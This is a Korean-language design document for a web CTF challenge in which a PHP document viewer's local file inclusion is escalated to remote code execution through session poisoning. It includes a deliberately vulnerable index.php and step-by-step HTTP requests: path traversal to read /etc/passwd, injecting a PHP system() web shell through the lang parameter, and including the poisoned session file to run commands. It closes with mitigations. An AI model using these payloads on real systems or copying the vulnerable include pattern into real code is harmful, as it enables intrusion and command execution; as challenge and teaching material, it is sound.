---
title: LFI to RCE via Session Poisoning — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, lfi, session-poisoning, php, rce, file-inclusion]
confidence: high
---

# LFI to RCE via Session Poisoning — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Multi-Language Reader (다국어 문서 뷰어)
- **난이도**: Medium-High
- **핵심 컨셉**: 클래식하지만 자주 출제되는 **LFI(Local File Inclusion)** 취약점을 **세션 포이즈닝(Session Poisoning)** 기법을 사용하여 RCE(원격 코드 실행) 공격으로 격상시키는 시나리오입니다. 대상 웹 사이트는 파라미터(`?page=ko.txt`)를 전달받아 로컬 가이드 파일을 화면에 로드합니다. 확장자가 부착되어 있거나 차단이 있어 다른 일반 파일을 곧바로 실행시킬 수는 없지만, 파일 읽기 권한을 이용해 세션 파일 경로(`/var/lib/php/sessions/sess_<session_id>`)를 찾아 읽을 수 있습니다. 공격자는 세션 데이터 내에 PHP 실행 쉘 코드를 주입하고 이를 LFI로 인클루드하여 코드를 실행시킵니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend**: 언어 설정 및 고객 가이드 뷰어 페이지.
- **Backend Service (PHP)**: 
  - 세션 기능을 활성화(`session_start()`)하여 방문자의 정보(언어, 장바구니 이름 등)를 저장함.
  - 사용자 매개변수를 이용해 특정 문서 파일을 로드하는 `include` 구문 구동.
- **Flag 위치**: 
  - 서버 내 임의 경로: `/flag_file_is_here`

### 2.2 취약점 지점
1. **Insecure Path Inclusion (LFI)**:
   - `include($_GET['page']);` 또는 `include("docs/" . $_GET['page']);` 구문으로 전달된 경로 검증이 누락되어, 타 디렉터리 내 세션 데이터 보관 폴더로 이동이 가능합니다.
2. **Session Storage Poisoning**:
   - 사용자가 전송한 사용자 데이터(예: 닉네임, 언어 선택명)를 백엔드가 여과 없이 세션 임시 파일에 쓰게 됩니다.
   - 예: `$_SESSION['lang'] = $_GET['lang'];` 에 의해 파일 내에 PHP 태그(`<?php system(...) ?>`)가 작성됩니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 / 파라미터 | 메소드 | 인증 | 입력 값 | 반환 값 | 비고 |
|---------------------|--------|------|---------|---------|------|
| `/?page=docs/ko.txt`| GET | 없음 | `page` 및 `lang` 등 | 페이지 본문 HTML | LFI 발생 지점 및 세션 주입 지점 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. LFI 및 세션 파일 위치 식별
1. 사용자는 문서 조회 파라미터에 상위 디렉터리 탈출 문자열을 대입해 봅니다:
   `/?page=../../../../etc/passwd`
2. 정상적으로 시스템 계정 정보가 출력된다면 LFI가 성립함을 파악합니다.
3. 이어서 브라우저 쿠키에서 `PHPSESSID` 값을 획득합니다 (예: `PHPSESSID=abcdef123456`).
4. 일반적인 PHP 세션 저장 경로와 조합하여 세션 파일에 읽기 시도를 수행합니다.
   `/?page=../../../../var/lib/php/sessions/sess_abcdef123456`
   - 만약 세션 파일의 내용(예: `lang|s:2:"ko";`)이 화면에 렌더링된다면 포이즈닝 대상 경로를 확보한 것입니다.

### Step 2. 세션 데이터 포이즈닝 (Poisoning)
세션에 기록되는 값 중 하나인 `lang` 파라미터에 악성 PHP 코드를 주입하여 세션 파일에 작성되도록 합니다.
- **세션 오염 요청**:
  ```http
  GET /?lang=<?php system($_GET['cmd']); ?> HTTP/1.1
  Host: reader.challenge.local
  Cookie: PHPSESSID=abcdef123456
  ```
  이 요청을 실행하면, 서버 세션 임시 파일(`/var/lib/php/sessions/sess_abcdef123456`)의 내용이 다음과 같이 오염됩니다:
  `lang|s:33:"<?php system($_GET['cmd']); ?>";`

### Step 3. 오염된 파일 인클루드 및 RCE 실행
공격자는 LFI 취약점을 동작시켜 오염된 세션 파일을 호출하게 만들고, 쉘 명령어를 쿼리스트링으로 전달합니다.
- *공격 실행 요청*:
  ```http
  GET /?page=../../../../var/lib/php/sessions/sess_abcdef123456&cmd=find / -name "*flag*" HTTP/1.1
  Host: reader.challenge.local
  Cookie: PHPSESSID=abcdef123456
  ```
- *동작 분석*: PHP가 세션 파일을 인클루드하는 과정에서 저장된 `<?php system(...) ?>` 코드를 텍스트가 아닌 실제 실행 가능한 PHP 스크립트로 해석하여 백엔드에서 명령어가 가동됩니다.

### Step 4. flag 획득
파일의 경로(예: `/flag_file_is_here`)를 확인했으므로 `cmd=cat /flag_file_is_here`를 보내 플래그 텍스트(`FLAG{php_lfi_session_poisoning_to_rce}`)를 화면에 출력받아 확보합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (PHP)

```php
// index.php
<?php
// PHP 세션 기동 -> /var/lib/php/sessions/sess_<session_id> 생성
session_start();

// 세션 포이즈닝 지점: 사용자 입력값을 세션 상태 데이터에 직접 기록
if (isset($_GET['lang'])) {
    $_SESSION['lang'] = $_GET['lang']; // 예: <?php system($_GET['cmd']); ?>
}

?>
<!DOCTYPE html>
<html>
<head><title>Multi-Language Guide</title></head>
<body>
    <h1>Document Viewer</h1>
    <?php
    // 취약점 지점 (LFI): 
    // 입력 값에 대한 상위 디렉터리 필터링이나 화이트리스트 검증 부재
    if (isset($_GET['page'])) {
        $file = $_GET['page'];
        include($file); // 외부 파일 포함 및 실행
    } else {
        include("welcome.txt");
    }
    ?>
</body>
</html>
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **인클루드 경로 제한 및 화이트리스트 매핑**:
   - 사용자 입력 값을 파일 시스템 경로로 직접 연결하지 마십시오. 사전에 허용된 파일 목록(화이트리스트)만 선택할 수 있게 매핑합니다.
   - **수정 예시**:
     ```php
     $allowed_pages = [
         "ko" => "docs/ko.txt",
         "en" => "docs/en.txt"
     ];
     $page = $_GET['page'];
     if (array_key_exists($page, $allowed_pages)) {
         include($allowed_pages[$page]);
     } else {
         echo "Invalid page";
     }
     ```
2. **세션 스토리지 외부에 쓰기 및 직렬화 안전 조치**:
   - 세션 쿠키는 서명되어 클라이언트 측에서 인계되어야 하며, 세션 파일 시스템 권한을 읽기 전용으로 제한하거나 웹 사용자 권한 외부 디렉터리에 위치시킵니다.
3. **`allow_url_include` 및 `open_basedir` 설정 활성화**:
   - `php.ini` 설정에서 `allow_url_include=Off`를 적용해 원격 파일 포함을 기본 차단하고, `open_basedir` 설정을 통해 지정된 웹 디렉터리 외의 파일(`/var/lib/php/*` 등)에 대해 프로세스가 파일 접근(읽기/인클루드)을 수행하지 못하도록 원천 봉쇄합니다.
